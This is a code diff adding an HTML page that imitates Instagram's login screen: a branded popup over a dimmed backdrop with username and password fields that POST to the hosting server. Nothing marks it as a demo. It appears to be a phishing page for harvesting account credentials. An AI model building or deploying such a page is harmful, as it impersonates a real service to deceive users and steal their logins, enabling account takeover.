@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Instagram Log in</title>
+  <style>
+    body {
+      background: rgba(0,0,0,0.6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .popup {
+      width: 350px;
+      background: #fff;
+      padding: 20px;
+      box-shadow: 0 0 20px #000;
+      border-radius: 8px;
+      text-align: center;
+    }
+    .popup img { width: 120px; }
+    input, button { width: 100%; margin: 10px 0; padding: 10px; }
+    button { background: #0095f6; color: #fff; border: none; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <div class="popup">
+    <img src="/assets/instagram.png" alt="Instagram">
+    <form method="POST">
+      <input type="text" name="email" placeholder="Phone number, username or email">
+      <input type="password" name="password" placeholder="Password">
+      <button type="submit">Log in</button>
+    </form>
+  </div>
+</body>
+</html>
